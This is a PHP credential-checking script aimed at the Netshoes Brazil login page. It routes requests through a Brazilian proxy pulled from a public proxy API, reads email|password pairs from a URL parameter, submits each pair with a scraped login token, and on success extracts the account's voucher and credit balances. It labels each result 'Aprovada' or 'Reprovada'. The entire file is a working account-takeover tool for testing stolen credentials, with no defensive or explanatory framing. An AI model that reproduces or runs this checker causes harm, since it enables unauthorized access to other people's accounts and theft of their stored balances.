<?php
set_time_limit(0);
error_reporting(0);

$link = file_get_contents("https://api.getproxylist.com/proxy?country[]=BR");
$link2 = json_decode($link);
$link3 = $link2->ip;
$link4 = $link2->port;
$proxy = $link3.":".$link4;


class cURL {
    var $callback = false;
    function setCallback($func_name) {
        $this->callback = $func_name;
    }
    function doRequest($method, $url, $vars) {
        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_NOBODY, 0);
        curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_HTTPHEADER, arraY("Accept: text/javascript, text/html, application/xml, text/xml, */*", "Content-Type: application/x-www-form-urlencoded", "Referer: https://www.netshoes.com.br/login"));
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        curl_setopt($ch, CURLOPT_TIMEOUT, 200);
        curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
        curl_setopt($ch, CURLOPT_VERBOSE, 1);
        if ($method == 'POST') {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $vars);
        }
        $data = curl_exec($ch);
       // echo $data;
        curl_close($ch);

        if ($data) {
            if ($this->callback) {
                $callback = $this->callback;
                $this->callback = false;
                return call_user_func($callback, $data);
            } else {
                return $data;
            }
        } else {
            return curl_error($ch);
        }
    }
    function get($url) {
        return $this->doRequest('GET', $url, 'NULL');
    }
    function post($url, $vars) {
        return $this->doRequest('POST', $url, $vars);
    }
}

function GetStr($string,$start,$end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}


$lista = $_GET["lista"];
$email = explode("|", $lista)[0];
$senha = explode("|", $lista)[1];



$nc = new cURL();
$getoken = $nc->get('https://www.netshoes.com.br/login');
$token = GetStr($getoken,'id="clipping" type="hidden" value="','"');



 
$a = new cURL(); 
       $b = $a->post ('https://www.netshoes.com.br/login', 'username='.$email.'&password='.$senha.'&recaptchaResponse=&clipping='.$token.'');
    
   $getscurl = new cURL();
        $getss = $getscurl->get('https://www.netshoes.com.br/new-account/ajax/my-vouchers');
if (file_exists(getcwd().'/cookie.txt')) {
            unlink(getcwd().'/cookie.txt');
        }
                $numero = GetStr($getss, '{"waitingActivationBalanceInCents":',',"');
         $nome = GetStr($getss, '"activeTotalBalanceInCents":',',"');
        
             
               
               

        if (strpos($b, '{}')) {  
 echo "#Aprovada - $email|$senha - Saldo a Liberar: <label class='badge badge-primary'>$numero</label> - Saldo Total: <label class='badge badge-primary'>$nome</label></td></tr> ";
               
        }else{

       echo "#Reprovada $email|$senha ";

 

}
 


?>

    </body>
</html>